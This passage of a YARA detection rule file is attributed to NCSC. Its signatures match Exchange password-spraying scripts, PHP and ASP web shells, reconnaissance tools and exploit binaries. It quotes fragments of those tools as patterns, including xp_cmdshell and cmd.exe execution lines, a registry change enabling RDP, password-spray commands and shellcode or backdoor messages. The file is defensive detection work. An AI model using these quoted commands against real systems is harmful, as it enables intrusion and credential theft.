      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "b6ee8a05b59f7b7cd2ea242b6e39201039d703556c100d243c1745234d90bcd5"
   strings:
      $x1 = "zL13fBXF+j9+snvSQ0hCOCcECEXKGpIAAZEOoqBGCL33qoSycZcmhxMQO9KVqqKCoBRBUQFRARERbNeKiuWq9yrqtV97we88bc9uzuL9/P778dI8M+955plnnnmm7u6c" ascii /* PEStudio Blacklist: strings */ /* score: '65.00'*/
      $x2 = "C:\\PS> Get-MailboxFolders -Mailbox current-user@domain.com -ExchHostname mail.domain.com -OutFile folders.txt -Remote" fullword ascii /* PEStudio Blacklist: strings */ /* score: '58.00'*/
      $x3 = "C:\\PS> Invoke-SelfSearch -Mailbox current-user@domain.com -CheckAttachments -DownloadDir C:\\temp" fullword ascii /* PEStudio Blacklist: strings */ /* score: '53.00'*/
      $x4 = "C:\\PS> Invoke-SelfSearch -Mailbox current-user@domain.com -ExchHostname mail.domain.com -OutputCsv mails.csv -Remote" fullword ascii /* PEStudio Blacklist: strings */ /* score: '53.00'*/
      $x5 = "C:\\PS> Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\\username -Password Fall2016 -OutFile global-addres" ascii /* PEStudio Blacklist: strings */ /* score: '50.00'*/
      $x6 = "#Set-Content -Path $env:temp\\$randomewsname-ews.dll -Value $UncompressedFileBytes -Encoding Byte" fullword ascii /* PEStudio Blacklist: strings */ /* score: '48.00'*/
      $x7 = "C:\\PS> Get-BaseLineResponseTime -OWAURL https://mail.company.com/owa/auth.owa -OWAURL2 https://mail.company.com/owa/" fullword ascii /* score: '48.00'*/
      $x8 = "This command will connect to the Exchange Web Services server at https://mail.domain.com/EWS/Exchange.asmx and attempt to passwo" ascii /* PEStudio Blacklist: strings */ /* score: '46.00'*/
      $x9 = "C:\\PS> Invoke-UsernameHarvestOWA -ExchHostname mail.domain.com -UserList .\\userlist.txt -Threads 1 -OutFile owa-valid-users.tx" ascii /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x10 = "C:\\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -AutoDiscoverEmail user@domain.com -Folder all" fullword ascii /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x11 = "C:\\PS> Invoke-PasswordSprayOWA -ExchHostname mail.domain.com -UserList .\\userlist.txt -Password Fall2016 -Threads 15 -OutFile " ascii /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x12 = "C:\\PS> Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\\userlist.txt -Password Fall2016 -Threads 15 -OutFile " ascii /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x13 = "#source: https://blogs.technet.microsoft.com/heyscriptingguy/2015/11/05/generate-random-letters-with-powershell/" fullword ascii /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x14 = "#Exchange Web Services Assembly generated with \"Out-CompressedDll\" from PowerSploit located here: https://github.com/PowerShel" ascii /* PEStudio Blacklist: strings */ /* score: '45.00'*/
      $x15 = "Write-Progress  -Activity \"Password Spraying the OWA portal at https://$ExchHostname/owa/. Sit tight...\" -Status \"$($(Get-Job" ascii /* PEStudio Blacklist: strings */ /* score: '44.00'*/
      $x16 = "Write-Progress  -Activity \"Password Spraying the EWS portal at https://$ExchHostname/EWS/Exchange.asmx. Sit tight...\" -Status " ascii /* PEStudio Blacklist: strings */ /* score: '44.00'*/
      $x17 = "C:\\PS> Invoke-GlobalMailSearch -ImpersonationAccount current-username -ExchHostname Exch01 -OutputCsv global-email-search.csv" fullword ascii /* PEStudio Blacklist: strings */ /* score: '44.00'*/
      $x18 = "$GetPeopleFiltersURL = (\"https://\" + $ExchHostname + \"/owa/service.svc?action=GetPeopleFilters\") " fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
      $x19 = "This command will connect to the remote Exchange server specified with -ExchHostname using Exchange Web Services where by defaul" ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
      $x20 = "This command will connect to the Outlook Web Access server at https://mail.domain.com/owa/ and attempt to password spray a list " ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
   condition:
      ( uint16(0) == 0x7566 and
        filesize < 2000KB and
        ( 1 of ($x*) )
      ) or ( all of them )
}

rule NCSC_up1_php {
   meta:
      description = "up1.php.jpg"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "515361b4109b52b10605f2d71f5fb3656aba0f3dfccecc1be555a8699a2a89fc"
   strings:
      $s1 = "<td><a href=\"./up.php?download=<?php echo $filename; ?>\"><?php echo $filename; ?></a></td>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s2 = "// It was then edited by Ryan McCue from http://cubegames.net/ to include file uploading" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s3 = "header(\"Content-type: application/x-download\");" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s4 = "$file = str_replace('/', '', $_GET['download']);" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.01'*/
      $s5 = "<form method=\"post\" action=\"<?php echo $_SERVER['PHP_SELF'];?>\" enctype=\"multipart/form-data\">" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s6 = "$success = move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);" fullword ascii /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s7 = "if ($_GET['download']) {" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s8 = "// find me at valhallaisland.com" fullword ascii /* score: '21.00'*/
      $s9 = "header('Content-Disposition: attachment; filename=\"'.$file.'\"');" fullword ascii /* score: '21.00'*/
      $s10 = "// When downloading force it to actually download" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s11 = "<link rel=\"stylesheet\" type=\"text/css\" href=\"resources/styles.css\" />" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s12 = "<td><a href=\"./up.php?rmfile=<?php echo $filename; ?>\">Delete</a></td>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s13 = "http://www.evoluted.net/community/code/directorylisting.php" fullword ascii /* score: '19.00'*/
      $s14 = "header(\"Content-Length: \".filesize($file));" fullword ascii /* score: '18.00'*/
      $s15 = "$readpath = str_replace($scriptname, \"\", $filepath);" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.01'*/
      $s16 = "error_reporting(E_ERROR);" fullword ascii /* PEStudio Blacklist: strings */ /* score: '17.00'*/
      $s17 = "<td><img src=\"resources/zip.gif\" /></td>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.00'*/
      $s18 = "$filepath = $_SERVER['SCRIPT_FILENAME'];" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.00'*/
      $s19 = "<p><input type=\"submit\" value=\"Upload\" /></p>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '16.00'*/
      $s20 = "$scriptname = basename($filepath);" fullword ascii /* PEStudio Blacklist: strings */ /* score: '15.17'*/
   condition:
      ( uint16(0) == 0x3f3c and
        filesize < 9KB and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_aa_asp_ {
   meta:
      description = "aa.asp;.jpg"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "15c62f5ed3da97e1f2e67209078bc012d592ac730e7db8ab1eeae96725c3f8e0"
   strings:
      $x1 = "//string cmdLine2 = \"cmd.exe /c netstat.exe -na > C:\\\\WINDOWS\\\\TEMP\\\\radB1B4D.tmp\";" fullword ascii /* PEStudio Blacklist: strings */ /* score: '63.00'*/
      $x2 = "string cmdLine = \"cmd.exe /c \" + command + \" > \" + tempFile;" fullword ascii /* PEStudio Blacklist: strings */ /* score: '63.00'*/
      $x3 = "<asp:ListItem Value=\"Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^&l" ascii /* PEStudio Blacklist: strings */ /* score: '62.00'*/
      $x4 = "<asp:ListItem Value=\"exec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_" ascii /* PEStudio Blacklist: strings */ /* score: '59.00'*/
      $x5 = "string cmdLine = fakeCmdPath + \" /c \" + command + \"  > \" + tempFile + \"\";" fullword ascii /* PEStudio Blacklist: strings */ /* score: '51.00'*/
      $x6 = "<asp:ListItem Value=\"Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')\">Add xp_cmdshell</asp:ListItem>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '47.00'*/
      $x7 = "td.Text = \"<a href=\\\"javascript:Bin_PostBack('urJG','\" + dt.Rows[j][\"ProcessID\"].ToString() + \"')\\\">Kill</a>\";" fullword ascii /* PEStudio Blacklist: strings */ /* score: '46.00'*/
      $x8 = "string realCmdPath = Environment.SystemDirectory + \"\\\\cmd.exe\";" fullword ascii /* PEStudio Blacklist: strings */ /* score: '44.00'*/
      $x9 = "vyX.Text += \"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\" + MVVJ(rootkey) + \"')\\\">\" + rootkey + \"</a> | \";" fullword ascii /* PEStudio Blacklist: strings */ /* score: '44.00'*/
      $x10 = "string iVDT = \"-SETUSERSETUP\\r\\n-IP=0.0.0.0\\r\\n-PortNo=52521\\r\\n-User=bin\\r\\n-Password=binftp\\r\\n-HomeDir=c:\\\\\\r" ascii /* PEStudio Blacklist: strings */ /* score: '42.00'*/
      $x11 = "<asp:ListItem Value=\"Exec master.dbo.xp_cmdshell 'net user'\">XP_cmdshell exec</asp:ListItem>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '42.00'*/
      $x12 = "WshShell.InvokeMember(\"Run\", BindingFlags.InvokeMethod, null, obj, new Object[] { cmdLine, type, wait });" fullword ascii /* PEStudio Blacklist: strings */ /* score: '41.00'*/
      $x13 = "private string ExecuteCommand2(string command, string tempFile)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '41.00'*/
      $x14 = "private string ExecuteCommand1(string command, string tempFile)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '41.00'*/
      $x15 = "Copyright &copy; 2010 l0rd -- <a href=\"/\" target=\"_blank\">WwW..com</a>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '40.01'*/
      $x16 = "tc.Text = \"<a href=\\\"javascript:Bin_PostBack('Bin_Regread','\" + MVVJ(rootkey) + \"')\\\">\" + rootkey + \"</a>\";" fullword ascii /* PEStudio Blacklist: strings */ /* score: '40.00'*/
      $x17 = "<input class=\"input\" runat=\"server\" id=\"kusi\" type=\"text\" size=\"100\" value=\"cmd.exe\" />" fullword ascii /* PEStudio Blacklist: strings */ /* score: '40.00'*/
      $x18 = "<td colspan=\"5\">CmdShell&nbsp;&nbsp;:&nbsp;<input class=\"input\" runat=\"server\" id=\"mHbjB\" type=\"text\" size=\"100\" val" ascii /* PEStudio Blacklist: strings */ /* score: '40.00'*/
      $x19 = "Uoc = ExecuteCommand2(command, tempFile);" fullword ascii /* PEStudio Blacklist: strings */ /* score: '39.17'*/
      $x20 = "<%@ Assembly Name=\"System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A\" %>" fullword ascii /* PEStudio Blacklist: strings */ /* score: '39.00'*/
   condition:
      ( uint16(0) == 0xd8ff and
        filesize < 700KB and
        ( 1 of ($x*) )
      ) or ( all of them )
}

rule NCSC_sublist3r {
   meta:
      description = "sublist3r.py"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "1aa240c9e772ccdc0b9a0ae5b6b56a8e2d3349e8b271f024b913da1e43f48b3b"
   strings:
      $x1 = "print(\"%s%s%s - %sFound open ports:%s %s%s%s\" % (G, host, W, R, W, Y, ', '.join(openports), W))" fullword ascii /* PEStudio Blacklist: strings */ /* score: '43.00'*/
      $x2 = "parser = argparse.ArgumentParser(epilog='\\tExample: \\r\\npython ' + sys.argv[0] + \" -d google.com\")" fullword ascii /* score: '42.00'*/
      $x3 = "headers['Referer'] = 'https://dnsdumpster.com'" fullword ascii /* PEStudio Blacklist: strings */ /* score: '41.00'*/
      $x4 = "self.base_url = 'https://searchdns.netcraft.com/?restriction=site+ends+with&host={domain}'" fullword ascii /* PEStudio Blacklist: strings */ /* score: '40.00'*/
      $x5 = "'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'," fullword ascii /* PEStudio Blacklist: agent */ /* score: '36.00'*/
      $x6 = "base_url = 'https://dnsdumpster.com/'" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x7 = "base_url = \"https://google.com/search?q={query}&btnG=Search&hl=en-US&biw=&bih=&gbv=1&start={page_no}&filter=0\"" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x8 = "link_regx = re.compile('<a href=\"http://toolbar.netcraft.com/site_report\\?url=(.*)\">')" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x9 = "t = threading.Thread(target=self.port_scan, args=(subdomain, self.ports))" fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x10 = "t = threading.Thread(target=self.check_host, args=(subdomain,))" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x11 = "# Coded By Ahmed Aboul-Ela - @aboul3la" fullword ascii /* score: '33.00'*/
      $x12 = "print(G + \"[-] Start port scan now for the following ports: %s%s\" % (Y, ports) + W)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x13 = "link_regx = re.compile('<div class=\"enum.*?\">.*?<a target=\"_blank\" href=\".*?\">(.*?)</a>', re.S)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x14 = "bruteforce_list = subbrute.print_target(parsed_domain.netloc, record_type, subs, resolvers, process_count, output, json_output, " ascii /* PEStudio Blacklist: strings */ /* score: '33.00'*/
      $x15 = "super(DNSdumpster, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x16 = "parser.add_argument('-t', '--threads', help='Number of threads to use for subbrute bruteforce', type=int, default=30)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x17 = "resp = self.session.get(url, headers=self.headers, timeout=self.timeout, cookies=cookies)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $x18 = "# By Ahmed Aboul-Ela - twitter.com/aboul3la" fullword ascii /* score: '30.00'*/
      $x19 = "url = 'http://searchdns.netcraft.com' + link" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $x20 = "base_url = 'https://www.bing.com/search?q={query}&go=Submit&first={page_no}'" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
   condition:
      ( uint16(0) == 0x2123 and
        filesize < 100KB and
        ( 1 of ($x*) )
      ) or ( all of them )
}

rule NCSC_guest_all {
   meta:
      description = "guest.all.bin"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "4164bf13c734b2b9f245965cbab2d1d711c5938d4c9313bf775fc79b2c56933a"
   strings:
      $x1 = "cmd /c reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f & " ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $s2 = "AWAVWVSPL" fullword ascii /* score: '6.50'*/
      $s3 = "USWVAWI" fullword ascii /* score: '5.50'*/
      $s4 = "ZXXYQQQ" fullword ascii /* score: '5.50'*/
      $s5 = "AQAPRQVH1" fullword ascii /* score: '5.00'*/
      $s6 = "QRAPAQARAS1" fullword ascii /* score: '5.00'*/
   condition:
      ( uint16(0) == 0xc031 and
        filesize < 7KB and
        ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule NCSC_Emphasismine_3_4_0 {
   meta:
      description = "Emphasismine-3.4.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "dcaf91bd4af7cc7d1fb24b5292be4e99c7adf4147892f6b3b909d1d84dd4e45b"
   strings:
      $x1 = "[+] MakeCallin: Calling into listener on target payload complete" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x2 = "Embedding remote listening ip and port into shellcode" fullword ascii /* PEStudio Blacklist: strings */ /* score: '34.00'*/
      $x3 = "embedding remote callback ip and port into shellcode" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x4 = "[*] MakeCallin: Calling into listener on target payload" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x5 = "Error: Could not calloc() for shellcode buffer" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x6 = "[+] Connecting to listener on %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.50'*/
      $x7 = "shellcodeEncodedBuffer: %s" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.02'*/
      $x8 = "Error: pcre_exec() reported an error (%d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s9 = "Error: my_pcre_match() was passed an invalid maxextract argument (%d < -1)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s10 = "Encoding shellcode for transmission" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s11 = "Generating random bytes to fill the buffer up to the vulnerable return address" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s12 = "Error: alphanumeric request identifier is not the expected value. (%s, %s)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.50'*/
      $s13 = "shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s14 = "Error: my_pcre_match() was passed a maxextract beyond the bounds of the ovector (%d >= %d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s15 = "Generating shellcode" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s16 = "([0-9a-zA-Z]+) OK LOGIN completed" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s17 = "Exiting processParams() (exit code %d)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s18 = "Target waiting for payload: " fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s19 = "%s LOGIN \"%s\" \"%s\"" fullword ascii /* PEStudio Blacklist: strings */ /* score: '24.00'*/
      $s20 = "Error: pcre_exec() returned an expectedly high number (%d > %d)" fullword ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 100KB and
        pe.imphash() == "2e4515eccee54ad5eb401518b9441485" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_HoboCopy {
   meta:
      description = "HoboCopy.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "41197283e48671353dfa249b01260abdc7953215e649aedf1afc951747362b34"
   strings:
      $x1 = "Component %d is named %s, has a path of %s, and is %sselectable for backup. %d files, %d databases, %d log files." fullword wide /* PEStudio Blacklist: strings */ /* score: '35.50'*/
      $x2 = "C:\\data\\projects\\hobocopy\\bin\\Release-W2K3\\x64\\HoboCopy.pdb" fullword ascii /* score: '32.00'*/
      $s3 = "Component %d has name %s, path %s, is %sselectable for backup, and has parent %s" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.50'*/
      $s4 = "HoboCopy (c) 2011 Wangdera Corporation. hobocopy@wangdera.com" fullword wide /* score: '26.00'*/
      $s5 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3" ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s6 = "Processing was cancelled by control-c, control-break, or a shutdown event. Terminating." fullword wide /* PEStudio Blacklist: strings */ /* score: '25.00'*/
      $s7 = "There was a COM failure 0x%x - %s (%d)" fullword wide /* score: '24.00'*/
      $s8 = "/skipdenied  - By default, if HoboCopy does not have sufficient" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s9 = "Permission denied when deleting file %s. Resetting read-only bit and retrying." fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00'*/
      $s10 = "c:\\data\\projects\\hobocopy\\CBackupState.h" fullword ascii /* PEStudio Blacklist: strings */ /* score: '22.00'*/
      $s11 = "Failure creating directory %s (as %s) - %s" fullword wide /* score: '22.00'*/
      $s12 = "<file>       - A file (e.g. foo.txt) or filespec (e.g. *.txt) to copy." fullword wide /* score: '21.00'*/
      $s13 = "               emitted. 3 - Errors, warnings, and some status" fullword wide /* PEStudio Blacklist: strings */ /* score: '21.00'*/
      $s14 = "Backup started at %s, completed at %s." fullword wide /* PEStudio Blacklist: strings */ /* score: '20.50'*/
      $s15 = "Skipping recursive delete of destination directory %s because it appears not to exist." fullword wide /* PEStudio Blacklist: strings */ /* score: '20.00'*/
      $s16 = "SystemTimeToFileTime failed with error %s" fullword wide /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s17 = "/clear       - Recursively delete the destination directory before" fullword wide /* PEStudio Blacklist: strings */ /* score: '19.00'*/
      $s18 = "/incremental - Perform an incremental copy. Only files that have" fullword wide /* score: '19.00'*/
      $s19 = "Error %d accessing file %s. Skipping." fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
      $s20 = "<src>        - The directory to copy (the source directory)." fullword wide /* PEStudio Blacklist: strings */ /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 400KB and
        pe.imphash() == "1cccaf0d390acb6e444871311b0da8a4" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_Unconfirmed_145425 {
   meta:
      description = "Unconfirmed 145425.crdownload"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "e8902087d47d91d40d7139ab0509d04cc8f4697ca31c9844867dd6ef445a9fdf"
   strings:
      $s1 = "autotouch.exe" fullword ascii /* score: '22.00'*/
      $s2 = "ucl.dll" fullword ascii /* score: '22.00'*/
      $s3 = "Esteemaudittouch-2.1.0.exe" fullword ascii /* score: '21.00'*/
      $s4 = "Smbtouch-1.1.1.exe" fullword ascii /* score: '20.00'*/
      $s5 = "exma-1.dll" fullword ascii /* score: '20.00'*/
      $s6 = "tibe-2.dll" fullword ascii /* score: '20.00'*/
      $s7 = "coli-0.dll" fullword ascii /* score: '20.00'*/
      $s8 = "autotouch.exe.config" fullword ascii /* score: '18.00'*/
      $s9 = "IPS.txt" fullword ascii /* score: '13.00'*/
      $s10 = "N& /s " fullword ascii /* score: '11.42'*/
      $s11 = "IPS.txt3" fullword ascii /* score: '10.00'*/
      $s12 = "Esteemaudittouch-2.1.0.xml" fullword ascii /* score: '9.00'*/
      $s13 = "Ja*[P:\\" fullword ascii /* score: '9.00'*/
      $s14 = "YITC:\"" fullword ascii /* score: '9.00'*/
      $s15 = "}UXh:\\" fullword ascii /* score: '9.00'*/
      $s16 = "]9e:\\G" fullword ascii /* score: '9.00'*/
      $s17 = "u:\\t9I" fullword ascii /* score: '9.00'*/
      $s18 = "Smbtouch-1.1.1.xml" fullword ascii /* score: '8.00'*/
      $s19 = "\"E9%M%}%#" fullword ascii /* score: '8.00'*/
      $s20 = "tsJRid0&" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x4b50 and
        filesize < 4000KB and
        ( 8 of them )
      ) or ( all of them )
}

rule NCSC_Explodingcan_2_0_2 {
   meta:
      description = "Explodingcan-2.0.2.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "97af543cf1fb59d21ba5ec6cb2f88c8c79c835f19c8f659057d2f58c321a0ad4"
   strings:
      $x1 = "[-] Connection closed by remote host (TCP Ack/Fin)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '35.00'*/
      $x2 = "[+] Target is %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '33.50'*/
      $x3 = "[-] Backdoor: Parameter_LocalFile_getValue(BackdoorBridgeDLL) failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x4 = "Failed to get process handle for termination" fullword ascii /* PEStudio Blacklist: strings */ /* score: '32.00'*/
      $x5 = "[*] Attemping to trigger IIS backdoor (up to %d tries)" fullword ascii /* PEStudio Blacklist: strings */ /* score: '31.00'*/
      $x6 = "[-] Encoding Exploit Payload failed to malloc memory!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '30.00'*/
      $s7 = "[-] Callback: Params_getCallbackPortValues(CallbackPort, CallbackLocalPort) failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s8 = "[-] PushBackdoorBridge: Socket send() error while transmitting package contents" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s9 = "[-] Listen: Parameter_Port_getValue(ListenPort) failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '29.00'*/
      $s10 = "[*] Exploiting Target" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s11 = "[-] Encoding Exploit Payload failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s12 = "[-] Post exploit select() failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s13 = "[-] TriggerBackdoor: failed to build headers for HTTP trigger request" fullword ascii /* PEStudio Blacklist: strings */ /* score: '28.00'*/
      $s14 = "[-] Backdoor: Parameter_U32_getValue(BackdoorRetries) failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s15 = "[-] PushBackdoorBridge: failed to read '%s' from disk" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00'*/
      $s16 = "[-] PushBackdoorBridge: failed to DMGD-wrap bridge DLL" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s17 = "[-] Listen: Parameter_Port_getValue(ListenLocalPort) failed!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s18 = "[-] Failed to receive a callback from target!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s19 = "[-] SendTriggerRequest: TbRecv() failed to read trigger response" fullword ascii /* PEStudio Blacklist: strings */ /* score: '26.00'*/
      $s20 = "Error launching PCCP process" fullword ascii /* PEStudio Blacklist: strings */ /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x5a4d and
        filesize < 100KB and
        pe.imphash() == "27a47edca567b9ed90c2d516ca5d05fa" and
        ( 1 of ($x*) or 4 of them )
      ) or ( all of them )
}

rule NCSC_Esteemaudit_2_1_0 {
   meta:
      description = "Esteemaudit-2.1.0.exe"
      author = "NCSC"
      reference = "OrangePeel"
      date = "2018-05-16"
      hash1 = "61f98b12c52739647326e219a1cf99b5440ca56db3b6177ea9db4e3b853c6ea6"
   strings:
      $x1 = "[-] build_egg1_listen_x64(): Failed to read ListenPayloadDLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '42.00'*/
      $x2 = "[-] build_egg1_listen_x86(): Failed to read ListenPayloadDLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '42.00'*/
      $x3 = "[-] Error processing packets - maximum error count reached - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '42.00'*/
      $x4 = "[-] build_egg1_listen_x64(): Failed to package up MigrateProcessDLL with DMGD!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '40.00'*/
      $x5 = "[-] build_egg1_listen_x86(): Failed to package up MigrateProcessDLL with DMGD!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '40.00'*/
      $x6 = "C:\\WINNT\\System32\\mstscax.dll" fullword ascii /* PEStudio Blacklist: strings */ /* score: '38.07'*/
      $x7 = "[-] build_egg1_listen_x86(): Failed to read MigrateProcessDLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '38.00'*/
      $x8 = "[-] build_egg1_listen_x64(): Failed to read MigrateProcessDLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '38.00'*/
      $x9 = "[-] build_egg1_listen_x86(): Failed to package up CallbackPayloadDLL with DMGD!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x10 = "[-] build_egg1_listen_x64(): Failed to package up CallbackPayloadDLL with DMGD!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x11 = "[-] build_egg1_callback_x86(): Failed to package up MigrateProcessDLL with DMGD!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x12 = "[-] build_egg1_callback_x64(): Failed to package up MigrateProcessDLL with DMGD!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '37.00'*/
      $x13 = "[+] Connected to target %s:%d" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.50'*/
      $x14 = "[-] RdpLib_GetConnectionInfo() failed - 0x%08x!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x15 = "[-] build_exploit_run_x64(): Cannot build execution ROP chain without knowing address of VirtualProtect()!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
      $x16 = "[-] build_egg1_callback_x64(): Failed to read CallbackPayloadDLL!" fullword ascii /* PEStudio Blacklist: strings */ /* score: '36.00'*/
